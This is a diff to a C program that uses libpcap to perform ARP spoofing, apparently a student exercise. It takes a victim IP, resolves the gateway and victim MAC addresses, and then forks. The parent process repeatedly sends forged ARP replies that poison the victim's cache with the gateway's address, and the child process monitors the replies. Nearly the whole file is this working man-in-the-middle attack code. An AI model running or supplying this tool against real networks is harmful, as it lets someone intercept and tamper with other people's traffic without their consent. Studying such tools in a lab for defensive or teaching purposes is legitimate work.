@@ -1,13 +1,10 @@
 #include "header.h"
 
-int main(int argc, char *argv[]) {
-	pcap_if_t *alldevs;
-	pcap_if_t *d;
-	int inum;
-	int i = 0;
-	pcap_t *fp;
-	char errbuf[PCAP_ERRBUF_SIZE];
-	
+int main(int argc, char *argv[]){
+	pcap_if_t *alldevs, *d;
+	uint32_t inum, i = 0;
+	uint8_t errbuf[PCAP_ERRBUF_SIZE];
+
 	// Check the validity of the command line
 	if (argc != 2) {
 		printf("Usage: %s <victim IP>\n", argv[0]);
@@ -35,7 +32,7 @@ int main(int argc, char *argv[]) {
 	printf("Enter the interface number (1-%d): ", i);
 	scanf("%d", &inum);
 	if (inum < 1 || inum > i) {
-		perror("\nInterface number out of range.\n");
+		perror("\nInterface number out of range\n");
 		// Free the device list
 		pcap_freealldevs(alldevs);
 		exit(1);
@@ -44,70 +41,111 @@ int main(int argc, char *argv[]) {
 	// Jump to the selected adapter
 	for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);
 
-
-
 	// Open the output device
+	pcap_t *fp;
 	fp = pcap_open_live(d->name, 65536, 0, 1000, errbuf);
 	if (fp == NULL) {
 		perror(errbuf);
 		exit(1);
 	}
-	
-	// Declare Interface
-	u_char *interface = (u_char *)malloc(strlen(d->name));
-	memcpy(interface, d->name, strlen(d->name));
-	
-	// Free the device list
-	pcap_freealldevs(alldevs);
-	
-	// Declare IP, MAC necessary
-	// Declare IP String Buffer
-	struct data_ip_host data;
-	u_char ip_addr_str[IP_ADDR_STR_SIZE];
-	
-	// Get my ip, my mac
-	get_my_ip_host(interface, &data.my_ip.s_addr, data.my_host);
-	
-	puts("");
-	inet_ntop(AF_INET, &data.my_ip.s_addr, ip_addr_str, IP_ADDR_STR_SIZE);
-	printf(" my ip:      %s\n", ip_addr_str);
-	printf(" my mac:     %02x:%02x:%02x:%02x:%02x:%02x\n", data.my_host[0], data.my_host[1], data.my_host[2], data.my_host[3], data.my_host[4], data.my_host[5]);
-	
-	// Get gateway ip, victim ip
-	get_gateway_ip(interface, &data.gateway_ip.s_addr);
-	inet_pton(AF_INET, argv[1], &data.victim_ip.s_addr);
-	
-	inet_ntop(AF_INET, &data.gateway_ip.s_addr, ip_addr_str, IP_ADDR_STR_SIZE);
-	printf(" gateway ip: %s\n", ip_addr_str);
-	inet_ntop(AF_INET, &data.victim_ip.s_addr, ip_addr_str, IP_ADDR_STR_SIZE);
-	printf(" victim ip:  %s\n", ip_addr_str);
-	puts("");
+	printf("\n");
 
-	// Declare ARP packet: 42bytess
-	u_char packet[ETH_ARP_H];
-	struct eth_arp_hdr pkt;
-	pkt._eth = (struct eth_hdr *)packet;
-	pkt._arp = (struct arp_hdr *)(packet + ETH_H);
-	
-	// Initialize packet
-	init_arp_packet(&pkt, &data);
-	// Set packet
-	set_arp_packet(&pkt, &data.victim_ip.s_addr, NULL, ARPOP_REQUEST);
-	// Send packet
+	// Declare interface, data
+	uint8_t *interface = (uint8_t *)malloc(strlen(d->name));
+	memcpy(interface, d->name, strlen(d->name));
+	pcap_freealldevs(alldevs);
+	struct data_ip_host data;
+
+	// Get my ip, my mac
+	get_my_ip_host(interface, &data.my_ip, data.my_host);
+	printf(" My IP:       ");
+	addr_print((uint8_t *)&data.my_ip.s_addr, IP_ADDR_LEN);
+	printf(" My MAC:      ");
+	addr_print(data.my_host, ETHER_ADDR_LEN);
+
+	// Get gateway ip, victim ip
+	get_gateway_ip(interface, &data.gateway_ip);
+	inet_pton(AF_INET, argv[1], &data.victim_ip.s_addr);
+	printf(" Gateway IP:  ");
+	addr_print((uint8_t *)&data.gateway_ip.s_addr, IP_ADDR_LEN);
+	printf(" Victim IP:   ");
+	addr_print((uint8_t *)&data.victim_ip.s_addr, IP_ADDR_LEN);
+
+	// Declare ARP packet: 60bytess
+	uint8_t packet[ETH_ARP_PAD_H] = { 0 };
+	struct eth_arp_hdr *pkt = (struct eth_arp_hdr *)packet;
+	init_arp_packet(pkt, &data);
+
+	// Get gateway mac
+	set_arp_packet(pkt, &data.gateway_ip, &data.my_ip, NULL, ARPOP_REQUEST);
 	send_arp_packet(fp, packet);
+	recv_arp_packet(fp, data.gateway_host, data.my_host, ARPOP_REPLY);
+	printf(" Gateway MAC: ");
+	addr_print(data.gateway_host, ETHER_ADDR_LEN);
+
+	// Get victim mac 
+	set_arp_packet(pkt, &data.victim_ip, &data.my_ip, NULL, ARPOP_REQUEST);
+	send_arp_packet(fp, packet);
+	recv_arp_packet(fp, data.victim_host, data.my_host, ARPOP_REPLY);
+	printf(" Victim MAC:  ");
+	addr_print(data.victim_host, ETHER_ADDR_LEN);
 	
-	// padding 여부는 패킷 길이로 확인
+
+	// Test
+	/*
+	const uint8_t victim_host_test[ETHER_ADDR_LEN] = { 0x00, 0x22, 0x44, 0x66, 0x88, 0xaa };
+	memcpy(data.victim_host, data.gateway_host, ETHER_ADDR_LEN);
+	printf(" Victim MAC:  ");
+	addr_print(data.victim_host, ETHER_ADDR_LEN);
+	*/
 	
-	// 피해자 mac주소 확인: Broadcast에 arp request 보내기 --> 1초 응답 대기 --> 안오면 또 보내기 --> 반복
-	// 피해자 감염: 피해자에게 arp reply 패킷 때리기 --> 1초 간격 반복 --> arp request로 감염 확
- 	
-	/* Send down the packet
-	if (pcap_sendpacket(fp, packet, ETH_ARP_H) != 0) {
-		perror(pcap_geterr(fp));
+	printf("\nStart ARP spoofing...\n");
+	pid_t pid;
+	
+	/*
+	int32_t fd[2], state;
+	state = pipe(fd);
+	if (state == -1) {
+		perror("\npipe() error\n");
 		exit(1);
 	}
 	*/
-	 
+
+	pid = fork();
+	if (pid == -1) {
+		perror("\nfork() error\n");
+		exit(1);
+	}
+	// child: Check
+	else if (pid == 0){
+		uint8_t host[ETHER_ADDR_LEN];
+
+		while (1) {
+			recv_arp_packet(fp, host, data.my_host, ARPOP_REPLY);
+			addr_print(host, ETHER_ADDR_LEN);
+		}
+	}
+	// parent: Infect
+	else {
+		for (i = 0; i < 300; i++) {
+			set_arp_packet(pkt, &data.victim_ip, &data.gateway_ip, data.victim_host, ARPOP_REPLY);
+			send_arp_packet(fp, packet);
+			usleep(SEC / 10);
+			set_arp_packet(pkt, &data.victim_ip, &data.my_ip, data.victim_host, ARPOP_REQUEST);
+			send_arp_packet(fp, packet);
+			usleep(SEC / 10);
+		}
+		printf("Complete forwarding %d packets.\n", i);
+
+		printf("\nKill child process: pid %d\n", pid);
+		if (kill(pid, SIGTERM) == -1) {
+			printf("child process is not terminated. kill all the process group.\n");
+			kill(0, SIGKILL);
+		}
+		printf("Child process is terminated.\n");
+	}
+
+	printf("\nGood Bye~ *^^*\n");
 	return 0;
 }
 
